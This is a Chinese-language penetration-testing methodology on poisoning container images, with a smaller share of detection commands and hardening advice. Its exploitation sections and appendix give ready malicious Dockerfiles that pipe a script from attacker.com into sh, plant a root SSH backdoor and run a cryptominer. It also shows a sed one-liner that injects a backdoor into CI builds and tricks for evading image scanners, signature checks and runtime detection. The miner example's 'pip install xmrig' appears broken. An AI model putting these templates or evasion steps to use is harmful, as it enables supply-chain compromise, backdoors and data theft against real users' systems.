# 镜像投毒攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的
- 为渗透测试人员提供容器镜像投毒攻击的系统化方法
- 指导测试人员识别和利用容器镜像供应链中的安全漏洞
- 帮助理解镜像签名、漏洞扫描等安全机制的重要性

## 1.2 适用范围
- 适用于使用 Docker、containerd 等容器技术的场景
- 适用于从公共或私有仓库拉取镜像的环境
- 适用于 CI/CD 中使用容器镜像的构建流程
- 适用于 Kubernetes 容器编排平台

## 1.3 读者对象
- 渗透测试工程师
- 容器安全研究人员
- DevSecOps 工程师
- Kubernetes 管理员

---

# 第二部分：核心渗透技术专题

## 专题一：镜像投毒攻击

### 2.1 技术介绍

镜像投毒攻击是指攻击者通过向公共或私有容器镜像仓库发布包含恶意代码的镜像，或者篡改现有镜像内容，当用户拉取并使用这些镜像时，恶意代码将在容器内执行，从而危害用户系统安全。

**攻击原理：**

```
┌─────────────────────────────────────────────────────────────┐
│                    镜像投毒攻击流程                          │
├─────────────────────────────────────────────────────────────┤
│  1. 攻击者创建包含恶意代码的 Dockerfile                      │
│  2. 构建镜像并推送到镜像仓库（公共或入侵私有仓库）            │
│  3. 受害者拉取镜像（可能认为是官方或可信镜像）               │
│  4. 运行容器，恶意代码执行                                   │
│  5. 攻击者达成目的（数据窃取、横向移动、持久化等）            │
└─────────────────────────────────────────────────────────────┘
```

**常见投毒手法：**

| 投毒手法 | 描述 | 危害等级 |
|---------|------|---------|
| 相似名称欺骗 | 发布与官方镜像名称相似的恶意镜像 | 高 |
| 标签劫持 | 使用 latest 或常见版本标签发布恶意镜像 | 高 |
| 依赖镜像投毒 | 篡改基础镜像，影响所有派生镜像 | 严重 |
| 构建时投毒 | 在 CI/CD 构建过程中注入恶意层 | 严重 |
| 仓库入侵投毒 | 入侵镜像仓库后批量篡改镜像 | 严重 |

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 使用非官方镜像 | docker pull nodejs (非 node) | 名称相似的恶意镜像 |
| 从不可信仓库拉取 | 使用第三方镜像源 | 镜像源可能包含恶意镜像 |
| 无签名验证 | 未启用 Docker Content Trust | 无法验证镜像来源 |
| 使用 latest 标签 | image:latest | 可能拉取到恶意更新 |
| 基础镜像老旧 | FROM ubuntu:18.04 | 基础镜像可能存在漏洞 |
| CI/CD 自动构建 | 自动构建并推送镜像 | 构建流程可能被篡改 |

**高风险特征：**
- 从非官方仓库拉取镜像
- 未启用镜像签名验证
- 使用模糊或通配符标签
- 镜像长期未更新扫描

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：识别目标使用的镜像**
```bash
# Kubernetes 环境
kubectl get pods -o yaml | grep image:

# Docker 环境
docker ps --format "{{.Image}}"

# 检查 Dockerfile
curl https://target.com/Dockerfile
```

**步骤二：检查镜像来源**
```bash
# 检查镜像详细信息
docker inspect target-image

# 查看镜像历史
docker history target-image

# 检查镜像签名
docker trust inspect --pretty target-image
```

**步骤三：漏洞扫描**
```bash
# 使用 Trivy 扫描
trivy image target-image

# 使用 Clair 扫描
clair-scanner -c http://clair-server:6060 target-image

# 使用 Anchore 扫描
anchore-cli image analyze target-image
```

**步骤四：检查仓库配置**
```bash
# 检查 Docker 配置
cat /etc/docker/daemon.json

# 检查是否启用内容信任
echo $DOCKER_CONTENT_TRUST

# 检查镜像拉取策略
kubectl get deployment -o yaml | grep imagePullPolicy
```

#### 2.3.2 白盒测试

**步骤一：审计 Dockerfile**
```bash
# 检查基础镜像来源
grep "^FROM" Dockerfile

# 检查是否有可疑 RUN 指令
grep "RUN.*curl\|wget\|bash\|sh" Dockerfile

# 检查环境变量
grep "ENV" Dockerfile

# 检查入口点
grep "ENTRYPOINT\|CMD" Dockerfile
```

**步骤二：检查 CI/CD 配置**
```bash
# 检查构建脚本
cat .github/workflows/docker-build.yml
cat Jenkinsfile

# 检查推送配置
# 是否有推送到非官方仓库
```

**步骤三：检查镜像仓库权限**
```bash
# Harbor 权限检查
curl -u admin:password https://harbor.com/api/v2.0/projects

# Docker Hub 检查
# 检查是否有未授权的推送权限
```

### 2.4 漏洞利用方法

#### 2.4.1 相似名称投毒

```bash
# 1. 创建与官方镜像相似的恶意镜像
# 官方：docker.io/library/node
# 恶意：docker.io/library/nodejs
# 恶意：docker.io/n0de/node
# 恶意：docker.io/node:latest (抢注)

# 2. 构建恶意镜像
cat > Dockerfile << EOF
FROM node:alpine
RUN apk add --no-cache curl
RUN curl http://attacker.com/backdoor.sh | sh
CMD ["node", "app.js"]
EOF

docker build -t nodejs:latest .

# 3. 推送到公共仓库
docker push nodejs:latest

# 4. 等待受害者拉取
# docker pull nodejs  # 可能拉到恶意镜像
```

#### 2.4.2 标签劫持

```bash
# 1. 获取某个镜像的发布权限
# 通过社会工程学或凭证泄露

# 2. 推送恶意版本到常用标签
docker tag malicious:latest target-image:1.0
docker tag malicious:latest target-image:latest
docker push target-image:1.0
docker push target-image:latest

# 3. 受害者更新时拉取恶意版本
```

#### 2.4.3 基础镜像投毒

```bash
# 1. 入侵基础镜像维护者账户
# 或创建相似的基础镜像

# 2. 在基础镜像中植入后门
cat > Dockerfile << EOF
FROM alpine:latest
RUN apk add --no-cache openssh
RUN echo 'root:backdoor' | chpasswd
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
ENTRYPOINT ["/usr/sbin/sshd", "-D"]
EOF

docker build -t alpine-secure:latest .
docker push alpine-secure:latest

# 3. 所有基于该镜像的派生镜像都受影响
```

#### 2.4.4 构建时投毒

```bash
# 1. 入侵 CI/CD 系统
# 利用 Jenkins、GitLab CI 等漏洞

# 2. 修改构建 Dockerfile
# 在构建过程中添加恶意层
sed -i '/^FROM/a RUN curl http://attacker.com/backdoor.sh | sh' Dockerfile

# 3. 构建并推送
docker build -t target-app:latest .
docker push target-app:latest
```

#### 2.4.5 仓库入侵投毒

```bash
# 1. 利用镜像仓库漏洞
# Nexus: CVE-2019-7238
# Harbor: CVE-2019-11094

# 2. 获取管理员权限
# 默认凭证或漏洞利用

# 3. 批量篡改镜像
# 修改现有镜像或推送恶意镜像
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过镜像扫描

```bash
# 1. 使用多阶段构建隐藏恶意层
FROM alpine AS builder
RUN wget http://attacker.com/backdoor -O /tmp/backdoor

FROM alpine
COPY --from=builder /tmp/backdoor /backdoor
# 扫描器可能只扫描最终镜像

# 2. 使用环境变量延迟执行
ENV BACKDOOR_URL=http://attacker.com/backdoor
RUN curl $BACKDOOR_URL | sh

# 3. 分层投毒
# 将恶意代码分散到多个层中
```

#### 2.5.2 绕过签名验证

```bash
# 如果目标未启用严格验证
# 可以推送无签名镜像

# 如果验证实现有缺陷
# 可能通过以下方式绕过：

# 1. 使用相同的基础镜像
# 签名只验证特定层

# 2. 利用签名过期
# 等待签名证书过期后推送

# 3. 针对不验证所有标签的场景
# 只篡改非 latest 标签
```

#### 2.5.3 绕过运行时检测

```bash
# 1. 使用合法工具进行恶意操作
# 利用镜像中已有的工具（curl、wget、nc）

# 2. 延迟执行
# 容器启动后定时执行恶意代码

# 3. 条件触发
# 检测到特定环境才执行
if [ "$HOSTNAME" = "target" ]; then
  curl http://attacker.com/exfil
fi
```

---

# 第三部分：附录

## 3.1 恶意 Dockerfile 示例

```dockerfile
# 示例 1: SSH 后门
FROM ubuntu:latest
RUN apt-get update && apt-get install -y openssh-server
RUN echo 'root:backdoor123' | chpasswd
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]

# 示例 2: 反向 Shell
FROM node:alpine
RUN apk add --no-cache curl
RUN curl http://attacker.com/backdoor.sh | sh
CMD ["node", "app.js"]

# 示例 3: 加密货币挖矿
FROM python:3.9
RUN pip install xmrig
CMD ["xmrig", "-o", "pool.attacker.com", "-u", "wallet"]
```

## 3.2 镜像安全检测命令

```bash
# 检查镜像历史
docker history --no-trunc image:tag

# 检查镜像签名
docker trust inspect --pretty image:tag

# 扫描镜像漏洞
trivy image --severity HIGH,CRITICAL image:tag

# 检查镜像配置
docker inspect image:tag

# 检查容器运行时行为
docker top container_id
docker exec container_id ps aux
```

## 3.3 安全配置建议

| 配置项 | 推荐设置 | 说明 |
|-------|---------|------|
| DOCKER_CONTENT_TRUST | 1 | 启用镜像签名验证 |
| imagePullPolicy | Always | 始终拉取最新镜像 |
| 镜像来源 | 官方/可信仓库 | 仅使用可信来源 |
| 漏洞扫描 | 每次构建前 | 自动扫描镜像漏洞 |
| 镜像签名 | cosign/notary | 所有镜像必须签名 |

## 3.4 相关 CVE 案例

| CVE 编号 | 受影响组件 | 描述 |
|---------|-----------|------|
| CVE-2019-7238 | Nexus Repository | 远程代码执行 |
| CVE-2019-11094 | Harbor | SQL 注入 |
| CVE-2020-15215 | containerd | 任意文件读取 |
| CVE-2021-41091 | Docker Desktop | 权限提升 |

---

## 参考资源

- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [Kubernetes Image Security](https://kubernetes.io/docs/concepts/containers/images/)
- [Sigstore Cosign](https://github.com/sigstore/cosign)
- [Trivy Image Scanner](https://github.com/aquasecurity/trivy)
